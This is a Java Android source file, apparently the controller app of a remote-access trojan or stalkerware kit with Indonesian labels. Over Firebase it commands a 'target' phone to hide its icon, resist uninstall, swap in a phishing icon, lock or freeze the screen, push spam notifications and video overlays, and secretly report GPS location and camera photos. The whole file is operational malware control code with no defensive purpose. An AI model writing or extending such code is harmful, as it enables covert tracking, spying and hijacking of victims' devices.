package com.paragon.control;

import android.app.AlertDialog;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {

    private DatabaseReference mDatabase;
    private StorageReference mStorage;
    private TextView tvDeviceName, tvDeviceId, tvBattery, tvStatus;
    private TextView tvFlashlightStatus, tvLockLowStatus, tvLockCustomStatus, tvHideIconStatus;
    private Switch swAntiUninstall, swFlashlight, swLockLow, swLockCustom, swHideIcon;
    private EditText etServerUrl;
    private Button btnSetServer;
    private static final int REQUEST_VIDEO = 1001;

    private ValueEventListener deviceListener;
    private ValueEventListener antiUninstallListener;
    private ValueEventListener flashlightListener;
    private ValueEventListener lockLowListener;
    private ValueEventListener lockCustomListener;
    private ValueEventListener hideIconListener;
    private ValueEventListener gpsListener;
    private ValueEventListener cameraListener;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        mDatabase = database.getReference("target");
        mStorage = FirebaseStorage.getInstance().getReference();

        tvDeviceName = findViewById(R.id.tvDeviceName);
        tvDeviceId = findViewById(R.id.tvDeviceId);
        tvBattery = findViewById(R.id.tvBattery);
        tvStatus = findViewById(R.id.tvStatus);
        tvFlashlightStatus = findViewById(R.id.tvFlashlightStatus);
        tvLockLowStatus = findViewById(R.id.tvLockLowStatus);
        tvLockCustomStatus = findViewById(R.id.tvLockCustomStatus);
        tvHideIconStatus = findViewById(R.id.tvHideIconStatus);

        swAntiUninstall = findViewById(R.id.swAntiUninstall);
        swFlashlight = findViewById(R.id.swFlashlight);
        swLockLow = findViewById(R.id.swLockLow);
        swLockCustom = findViewById(R.id.swLockCustom);
        swHideIcon = findViewById(R.id.swHideIcon);

        etServerUrl = findViewById(R.id.etServerUrl);
        btnSetServer = findViewById(R.id.btnSetServer);

        Button btnGanti = findViewById(R.id.btnGanti);
        Button btnTemaPhising = findViewById(R.id.btnTemaPhising);
        Button btnVideoOverlay = findViewById(R.id.btnVideoOverlay);
        Button btnSpamNotif = findViewById(R.id.btnSpamNotif);
        Button btnStuckLayar = findViewById(R.id.btnStuckLayar);
        Button btnGPS = findViewById(R.id.btnGPS);
        Button btnKamera = findViewById(R.id.btnKamera);

        sendMyDeviceInfo();
        listenDeviceInfoRealtime();
        listenStatusRealtime();
        listenGPSRealtime();
        listenCameraRealtime();

        // ===== FITUR GANTI SERVER =====
        btnSetServer.setOnClickListener(v -> {
            String newUrl = etServerUrl.getText().toString().trim();
            if (!newUrl.isEmpty()) {
                mDatabase.child("serverUrl").setValue(newUrl);
                Toast.makeText(this, "✅ Server URL diubah!", Toast.LENGTH_SHORT).show();
                etServerUrl.setText("");
            } else {
                Toast.makeText(this, "❌ URL kosong!", Toast.LENGTH_SHORT).show();
            }
        });

        swAntiUninstall.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("antiUninstall").setValue(isChecked);
            Toast.makeText(this, "Anti Uninstall: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        btnGanti.setOnClickListener(v -> Toast.makeText(this, "Fitur Ganti Target", Toast.LENGTH_SHORT).show());

        swFlashlight.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("flashlight").setValue(isChecked);
            Toast.makeText(this, "Flashlight: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        swLockLow.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("lockLow").setValue(isChecked);
            Toast.makeText(this, "Lock Low: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        swLockCustom.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("lockCustom").setValue(isChecked);
            Toast.makeText(this, "Lock Custom V2: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        btnTemaPhising.setOnClickListener(v -> {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("🎨 Tema Phising");
            final EditText input = new EditText(this);
            input.setHint("Masukkan URL icon baru...");
            builder.setView(input);
            builder.setPositiveButton("GANTI", (dialog, which) -> {
                String url = input.getText().toString();
                if (!url.isEmpty()) {
                    mDatabase.child("temaPhising").setValue(url);
                    Toast.makeText(this, "✅ Icon diubah!", Toast.LENGTH_SHORT).show();
                }
            });
            builder.setNegativeButton("Batal", null);
            builder.show();
        });

        swHideIcon.setOnCheckedChangeListener((buttonView, isChecked) -> {
            mDatabase.child("hideIcon").setValue(isChecked);
            Toast.makeText(this, "Hide Icon: " + (isChecked ? "ON" : "OFF"), Toast.LENGTH_SHORT).show();
        });

        btnVideoOverlay.setOnClickListener(v -> {
            Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
            intent.setType("video/*");
            startActivityForResult(intent, REQUEST_VIDEO);
        });

        btnSpamNotif.setOnClickListener(v -> {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("📨 Kirim Spam Notifikasi");
            final EditText input = new EditText(this);
            input.setHint("Ketik pesan spam...");
            builder.setView(input);
            builder.setPositiveButton("KIRIM", (dialog, which) -> {
                String pesan = input.getText().toString();
                if (!pesan.isEmpty()) {
                    mDatabase.child("spamNotif").setValue(pesan);
                    Toast.makeText(this, "✅ Spam terkirim!", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(this, "❌ Pesan kosong!", Toast.LENGTH_SHORT).show();
                }
            });
            builder.setNegativeButton("Batal", null);
            builder.show();
        });

        btnStuckLayar.setOnClickListener(v -> {
            mDatabase.child("stuckLayar").setValue("TAP, BLOCK TOUCH");
            Toast.makeText(this, "🔒 Stuck Layar: BLOCK TOUCH", Toast.LENGTH_SHORT).show();
        });

        btnGPS.setOnClickListener(v -> {
            mDatabase.child("command").setValue("gps");
            Toast.makeText(this, "📍 Mengambil lokasi target...", Toast.LENGTH_SHORT).show();
        });

        btnKamera.setOnClickListener(v -> {
            AlertDialog.Builder builder = new AlertDialog.Builder(this);
            builder.setTitle("📸 Pilih Kamera Target");
            builder.setItems(new String[]{"📷 Kamera Depan", "📷 Kamera Belakang"}, (dialog, which) -> {
                String command = (which == 0) ? "camera_front" : "camera_back";
                mDatabase.child("command").setValue(command);
                Toast.makeText(this, "📸 Mengambil foto...", Toast.LENGTH_SHORT).show();
            });
            builder.show();
        });
    }

    // ===== REAL-TIME: GPS =====
    private void listenGPSRealtime() {
        gpsListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String loc = snapshot.getValue(String.class);
                if (loc != null && !loc.isEmpty()) {
                    String[] parts = loc.split(",");
                    if (parts.length == 2) {
                        String lat = parts[0].trim();
                        String lon = parts[1].trim();
                        String uri = "geo:" + lat + "," + lon + "?q=" + lat + "," + lon;
                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(uri));
                        intent.setPackage("com.google.android.apps.maps");
                        if (intent.resolveActivity(getPackageManager()) != null) {
                            startActivity(intent);
                        } else {
                            intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://maps.google.com/?q=" + lat + "," + lon));
                            startActivity(intent);
                        }
                        Toast.makeText(MainActivity.this, "📍 Lokasi: " + lat + ", " + lon, Toast.LENGTH_SHORT).show();
                        mDatabase.child("gpsLocation").removeValue();
                    }
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("gpsLocation").addValueEventListener(gpsListener);
    }

    // ===== REAL-TIME: KAMERA =====
    private void listenCameraRealtime() {
        cameraListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                String photoUrl = snapshot.getValue(String.class);
                if (photoUrl != null && !photoUrl.isEmpty()) {
                    Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(photoUrl));
                    startActivity(intent);
                    Toast.makeText(MainActivity.this, "📸 Foto berhasil diambil!", Toast.LENGTH_SHORT).show();
                    mDatabase.child("photoUrl").removeValue();
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("photoUrl").addValueEventListener(cameraListener);
    }

    private void listenDeviceInfoRealtime() {
        deviceListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                if (snapshot.exists()) {
                    String deviceName = snapshot.child("deviceName").getValue(String.class);
                    String deviceId = snapshot.child("deviceId").getValue(String.class);
                    Integer battery = snapshot.child("battery").getValue(Integer.class);
                    Boolean online = snapshot.child("online").getValue(Boolean.class);
                    runOnUiThread(() -> {
                        if (deviceName != null) tvDeviceName.setText(deviceName);
                        if (deviceId != null) tvDeviceId.setText(deviceId);
                        if (battery != null) tvBattery.setText(battery + "%");
                        if (online != null) {
                            tvStatus.setText(online ? "ONLINE" : "OFFLINE");
                            tvStatus.setTextColor(online ? 0xFF00FF41 : 0xFFFF1744);
                        }
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("deviceInfo").addValueEventListener(deviceListener);
    }

    private void listenStatusRealtime() {
        flashlightListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        tvFlashlightStatus.setText(value ? "ON" : "OFF");
                        tvFlashlightStatus.setTextColor(value ? 0xFF00FF41 : 0xFFFF1744);
                        swFlashlight.setChecked(value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("flashlight").addValueEventListener(flashlightListener);

        lockLowListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        tvLockLowStatus.setText(value ? "ON" : "OFF");
                        tvLockLowStatus.setTextColor(value ? 0xFF00FF41 : 0xFFFF1744);
                        swLockLow.setChecked(value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("lockLow").addValueEventListener(lockLowListener);

        lockCustomListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        tvLockCustomStatus.setText(value ? "ON" : "OFF");
                        tvLockCustomStatus.setTextColor(value ? 0xFF00FF41 : 0xFFFF1744);
                        swLockCustom.setChecked(value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("lockCustom").addValueEventListener(lockCustomListener);

        hideIconListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> {
                        tvHideIconStatus.setText(value ? "ON" : "OFF");
                        tvHideIconStatus.setTextColor(value ? 0xFF00FF41 : 0xFFFF1744);
                        swHideIcon.setChecked(value);
                    });
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("hideIcon").addValueEventListener(hideIconListener);

        antiUninstallListener = new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot snapshot) {
                Boolean value = snapshot.getValue(Boolean.class);
                if (value != null) {
                    runOnUiThread(() -> swAntiUninstall.setChecked(value));
                }
            }
            @Override
            public void onCancelled(@NonNull DatabaseError error) {}
        };
        mDatabase.child("antiUninstall").addValueEventListener(antiUninstallListener);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_VIDEO && resultCode == RESULT_OK && data != null) {
            Uri videoUri = data.getData();
            uploadVideoToFirebase(videoUri);
        }
    }

    private void uploadVideoToFirebase(Uri videoUri) {
        Toast.makeText(this, "📤 Uploading video...", Toast.LENGTH_SHORT).show();
        StorageReference ref = mStorage.child("videos/" + System.currentTimeMillis() + ".mp4");
        ref.putFile(videoUri).addOnSuccessListener(taskSnapshot -> {
            ref.getDownloadUrl().addOnSuccessListener(uri -> {
                mDatabase.child("videoUrl").setValue(uri.toString());
                Toast.makeText(this, "✅ Video terkirim ke target!", Toast.LENGTH_SHORT).show();
            });
        }).addOnFailureListener(e -> {
            Toast.makeText(this, "❌ Gagal upload video!", Toast.LENGTH_SHORT).show();
        });
    }

    private void sendMyDeviceInfo() {
        String deviceName = Build.MODEL;
        String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        int battery = getBatteryLevel();
        Map<String, Object> data = new HashMap<>();
        data.put("deviceName", deviceName);
        data.put("deviceId", deviceId);
        data.put("battery", battery);
        data.put("online", true);
        data.put("timestamp", System.currentTimeMillis());
        mDatabase.child("deviceInfo").setValue(data);
    }

    private int getBatteryLevel() {
        android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(BATTERY_SERVICE);
        return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (deviceListener != null) mDatabase.child("deviceInfo").removeEventListener(deviceListener);
        if (flashlightListener != null) mDatabase.child("flashlight").removeEventListener(flashlightListener);
        if (lockLowListener != null) mDatabase.child("lockLow").removeEventListener(lockLowListener);
        if (lockCustomListener != null) mDatabase.child("lockCustom").removeEventListener(lockCustomListener);
        if (hideIconListener != null) mDatabase.child("hideIcon").removeEventListener(hideIconListener);
        if (antiUninstallListener != null) mDatabase.child("antiUninstall").removeEventListener(antiUninstallListener);
        if (gpsListener != null) mDatabase.child("gpsLocation").removeEventListener(gpsListener);
        if (cameraListener != null) mDatabase.child("photoUrl").removeEventListener(cameraListener);
    }
                            }
